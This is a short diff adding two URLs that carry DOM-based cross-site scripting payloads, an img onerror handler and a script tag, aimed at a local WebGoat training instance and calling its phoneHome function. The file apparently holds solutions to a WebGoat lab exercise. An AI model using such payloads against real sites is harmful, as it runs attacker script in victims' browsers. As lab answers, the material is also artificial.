@@ -1,0 +1,3 @@
+http://localhost:8080/WebGoat/start.mvc#test/<img src=x onerror=webgoat.customjs.phoneHome()>
+
+http://localhost:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2fscript>
